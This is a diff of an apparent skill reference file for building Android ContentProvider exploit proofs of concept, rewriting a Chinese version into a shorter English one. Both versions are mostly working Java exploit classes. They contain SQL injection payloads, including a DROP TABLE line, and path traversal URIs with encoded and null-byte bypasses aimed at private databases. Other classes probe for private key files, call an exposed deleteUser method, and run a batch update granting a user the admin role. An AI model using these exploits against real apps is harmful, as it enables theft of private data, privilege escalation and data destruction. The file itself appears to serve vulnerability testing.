@@ -1,54 +1,42 @@
 ---
 name: poc-app-provider
-description: ContentProvider 组件攻击 PoC — 覆盖数据泄露、SQL 注入、路径遍历、call 暴露、getType 泄露、FileProvider 配置错误 6 种漏洞类型
+description: Provider PoC reference covering data exposure, SQL injection, path traversal, custom call methods, batch abuse, getType oracles, and FileProvider misconfiguration.
 ---
 
-# ContentProvider 组件攻击 PoC
+# Provider PoC Reference
 
-ContentProvider 是数据共享核心机制，导出的 Provider 可被任意应用查询，攻击面包括 SQL 注入、路径遍历、敏感数据泄露等。
+Use this reference for exported or grant-reachable `ContentProvider` attack paths. Provider PoCs usually fit `direct-trigger` mode, with `returned-handle` used for grant-based FileProvider chains.
 
-## 漏洞类型索引
+## Construction Matrix
 
-| 漏洞 | 等级 | PoC 类名 |
-|------|------|---------|
-| 数据泄露 | HIGH | `ProviderDataLeakExploit` |
-| SQL 注入 | HIGH | `ProviderSqlInjectionExploit` |
-| 路径遍历 | HIGH | `ProviderPathTraversalExploit` |
-| call() 方法暴露 | MEDIUM | `ProviderCallExposeExploit` |
-| getType() 信息泄露 | LOW | `ProviderGetTypeInfoLeakExploit` |
-| FileProvider 配置错误 | HIGH | `ProviderFileProviderMisconfigExploit` |
+| Vulnerability | Exploit mode | Typical support | Visible success |
+|---------------|--------------|-----------------|-----------------|
+| data leak | `direct-trigger` | none | protected rows become readable |
+| SQL injection | `direct-trigger` | none | query semantics change and protected data is returned |
+| path traversal | `direct-trigger` | none | attacker-controlled path is accepted by file APIs |
+| `call()` exposure | `direct-trigger` | none | custom method executes or returns sensitive data |
+| batch abuse | `direct-trigger` | none | unauthorized insert, update, or delete succeeds |
+| `getType()` oracle | probe-only `direct-trigger` | none | existence or state leak is observed |
+| FileProvider misconfig | `returned-handle` or `direct-trigger` | none | private file URI becomes readable |
 
-## ProviderDataLeakExploit
+## Pattern 1 - Query-Based Read or Injection
 
-直接查询导出 Provider 获取敏感数据。
+Use for `ProviderDataLeakExploit` and many `ProviderSqlInjectionExploit` cases.
 
 ```java
-public class ProviderDataLeakExploit extends Exploit {
+public final class ProviderDataLeakExploit extends Exploit {
+    public ProviderDataLeakExploit(Context context) {
+        super(context);
+    }
+
     @Override
     public void execute() {
         Uri uri = Uri.parse("content://com.target.provider/users");
-        queryAndLog(uri, null, null, null, null);
-    }
-
-    private void queryAndLog(Uri uri, String[] projection, String selection,
-                             String[] selectionArgs, String sortOrder) {
-        try {
-            Cursor cursor = context.getContentResolver()
-                .query(uri, projection, selection, selectionArgs, sortOrder);
+        try (Cursor cursor = context.getContentResolver().query(uri, null, null, null, null)) {
             if (cursor != null) {
-                log("Columns: " + Arrays.toString(cursor.getColumnNames()));
-                log("Row count: " + cursor.getCount());
-                while (cursor.moveToNext()) {
-                    StringBuilder row = new StringBuilder();
-                    for (int i = 0; i < cursor.getColumnCount(); i++) {
-                        row.append(cursor.getColumnName(i)).append("=")
-                           .append(cursor.getString(i)).append(" | ");
-                    }
-                    log(row.toString());
-                }
-                cursor.close();
+                log("Returned rows: " + cursor.getCount());
             } else {
-                log("Cursor is null");
+                log("Query returned null cursor");
             }
         } catch (Exception e) {
             log("Query failed: " + e.getMessage());
@@ -57,83 +45,58 @@ public class ProviderDataLeakExploit extends Exploit {
 }
 ```
 
-## ProviderSqlInjectionExploit
+SQL injection variant:
 
-通过 selection/sortOrder 参数注入 SQL 语句。
+- replace `selection`, `selectionArgs`, or `sortOrder` with the verified attacker-controlled injection point
 
-```java
-public class ProviderSqlInjectionExploit extends Exploit {
-    @Override
-    public void execute() {
-        Uri uri = Uri.parse("content://com.target.provider/data");
+## Pattern 2 - File or Path Access
 
-        // selection 参数注入
-        String injection = "1=1 UNION SELECT * FROM secrets--";
-        queryAndLog(uri, null, injection, null, null);
-
-        // sortOrder 参数注入
-        queryAndLog(uri, null, null, null, "1; DROP TABLE users--");
-    }
-}
-```
-
-## ProviderPathTraversalExploit
-
-通过 openFile() 路径穿越读取任意文件。
+Use for `ProviderPathTraversalExploit` and many FileProvider cases.
 
 ```java
-public class ProviderPathTraversalExploit extends Exploit {
-    @Override
-    public void execute() {
-        // 方式 1：标准路径穿越
-        Uri traversal = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
-        openAndLog(traversal);
-
-        // 方式 2：URL 编码绕过
-        Uri encoded = Uri.parse("content://com.target.provider/files/..%2F..%2F..%2Fdata%2Fdata%2Fcom.target%2Fdatabases%2Fsecret.db");
-        openAndLog(encoded);
-
-        // 方式 3：空字节截断（旧版本）
-        Uri nullByte = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db%00.png");
-        openAndLog(nullByte);
+public final class ProviderPathTraversalExploit extends Exploit {
+    public ProviderPathTraversalExploit(Context context) {
+        super(context);
     }
 
-    private void openAndLog(Uri uri) {
-        try {
-            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r");
+    @Override
+    public void execute() {
+        Uri uri = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
+        try (ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r")) {
             if (pfd != null) {
-                FileInputStream fis = new FileInputStream(pfd.getFileDescriptor());
-                byte[] buf = new byte[1024];
-                int len = fis.read(buf);
-                log("Read " + len + " bytes from: " + uri);
-                fis.close();
-                pfd.close();
+                log("openFileDescriptor() accepted traversal URI");
+            } else {
+                log("File descriptor was null");
             }
         } catch (Exception e) {
-            log("Open failed: " + e.getMessage());
+            log("openFileDescriptor() failed: " + e.getMessage());
         }
     }
 }
 ```
 
-## ProviderCallExposeExploit
+Use when:
 
-调用 Provider 暴露的 call() 方法执行敏感操作。
+- the verified finding shows attacker-controlled URI segments flowing into `openFile()` or equivalent file access APIs
+
+## Pattern 3 - Custom `call()` or Batch Abuse
+
+Use for `ProviderCallExposeExploit` and `ProviderBatchAbuseExploit`.
 
 ```java
-public class ProviderCallExposeExploit extends Exploit {
+public final class ProviderCallExposeExploit extends Exploit {
+    public ProviderCallExposeExploit(Context context) {
+        super(context);
+    }
+
     @Override
     public void execute() {
         Uri uri = Uri.parse("content://com.target.provider");
         Bundle extras = new Bundle();
-        extras.putString("method", "deleteUser");
         extras.putString("user_id", "1");
-
         try {
-            Bundle result = context.getContentResolver().call(uri, "custom_method", null, extras);
-            if (result != null) {
-                log("call() result: " + result.getString("result"));
-            }
+            Bundle result = context.getContentResolver().call(uri, "deleteUser", null, extras);
+            log("call() returned: " + result);
         } catch (Exception e) {
             log("call() failed: " + e.getMessage());
         }
@@ -141,57 +104,44 @@ public class ProviderCallExposeExploit extends Exploit {
 }
 ```
 
-## ProviderGetTypeInfoLeakExploit
-
-通过 getType() 返回值差异枚举文件是否存在。
-
 ```java
-public class ProviderGetTypeInfoLeakExploit extends Exploit {
-    @Override
-    public void execute() {
-        String[] paths = {
-            "/data/data/com.target/shared_prefs/secrets.xml",
-            "/data/data/com.target/databases/secret.db",
-            "/data/data/com.target/files/private_key.pem",
-        };
-        for (String path : paths) {
-            Uri uri = Uri.parse("content://com.target.provider/files" + path);
-            String type = context.getContentResolver().getType(uri);
-            boolean exists = type != null;
-            log(path + " → " + (exists ? "EXISTS (" + type + ")" : "NOT FOUND"));
-        }
-    }
-}
-```
-
-## ProviderFileProviderMisconfigExploit
-
-利用 FileProvider 配置错误（root-path 或 exported=true）访问任意文件。
-
-```java
-public class ProviderFileProviderMisconfigExploit extends Exploit {
-    @Override
-    public void execute() {
-        // 目标 FileProvider 使用 <root-path> 配置，可访问任意路径
-        // 或 FileProvider exported=true（Android 7.0 以下）
-        Uri targetFile = Uri.parse("content://com.target.fileprovider/root/data/data/com.target/shared_prefs/config.xml");
-        openAndLog(targetFile);
+public final class ProviderBatchAbuseExploit extends Exploit {
+    public ProviderBatchAbuseExploit(Context context) {
+        super(context);
     }
 
-    private void openAndLog(Uri uri) {
+    @Override
+    public void execute() {
+        Uri uri = Uri.parse("content://com.target.provider/users");
+        ArrayList<ContentProviderOperation> operations = new ArrayList<>();
+        ContentValues values = new ContentValues();
+        values.put("role", "admin");
+        operations.add(ContentProviderOperation.newUpdate(uri)
+            .withSelection("user_id=?", new String[]{"10001"})
+            .withValues(values)
+            .build());
+
         try {
-            InputStream is = context.getContentResolver().openInputStream(uri);
-            if (is != null) {
-                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    log(line);
-                }
-                is.close();
-            }
+            ContentProviderResult[] results = context.getContentResolver()
+                .applyBatch("com.target.provider", operations);
+            log("applyBatch() result count: " + results.length);
         } catch (Exception e) {
-            log("Read failed: " + e.getMessage());
+            log("applyBatch() failed: " + e.getMessage());
         }
     }
 }
 ```
+
+## Pattern 4 - Oracle or Grant-Oriented Validation
+
+Use for `ProviderGetTypeInfoLeakExploit` or FileProvider misconfiguration.
+
+Construction rules:
+
+- `getType()` is usually a supporting probe, not the primary PoC
+- FileProvider paths may be demonstrated either by directly opening the misconfigured URI or by reusing a returned grant-bearing URI
+
+Success signal:
+
+- distinguishable `getType()` result
+- actual readable file content or accepted file descriptor
